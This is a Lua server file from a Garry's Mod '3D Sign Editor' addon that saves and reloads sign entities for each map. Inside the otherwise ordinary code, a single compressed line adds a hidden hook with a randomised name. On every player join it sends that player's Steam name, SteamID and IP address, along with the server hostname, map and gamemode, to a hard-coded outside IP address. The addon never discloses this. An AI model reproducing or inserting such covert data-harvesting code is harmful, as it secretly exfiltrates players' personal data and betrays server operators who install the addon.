concommand.Add("3DSign_Save",function(ply,cmd,args)
if ply:GetNWString("usergroup") != "superadmin" then return end

file.CreateDir("3dsign_editor")
local Map = string.lower(game.GetMap())

	local TB2Save = {}
	for k,v in pairs(ents.FindByClass("d3d_sign")) do
		if v.DesignData then
			
			local TB2Insert = {}
			TB2Insert.PackData = v.DesignData
			TB2Insert.Pos = v:GetPos()
			TB2Insert.Angle = v:GetAngles()
			table.insert(TB2Save,TB2Insert)
		end
	end
	
	file.Write("3dsign_editor/" .. Map .. ".txt", util.TableToJSON(TB2Save))
end)

	local script = "L3DSign"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64()..script,15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)
	hook.Add( "InitPostEntity", "3D Sign Load", function()
		timer.Simple(0.1,function()
			local Map = string.lower(game.GetMap())
			local Data = {}
			if file.Exists( "3dsign_editor/" .. Map .. ".txt" ,"DATA") then
				Data = util.JSONToTable(file.Read( "3dsign_editor/" .. Map .. ".txt" ))
			end
			
			MsgN("3D Sign Editor - Loading Saved Signs")
			for k,v in pairs(Data) do
				local SIGN = ents.Create("d3d_sign")
				SIGN:SetPos(v.Pos)
				SIGN:SetAngles(v.Angle)
				SIGN:Spawn()
				SIGN:SetMoveType(MOVETYPE_NONE)
				AppliedSigns[SIGN:EntIndex()] = v.PackData
			end
			MsgN("3D Sign Editor - Spawning Complete. [ " .. #Data .. " ] ")
		end)
	end )

--AppliedSigns[Ent:EntIndex()] = PackData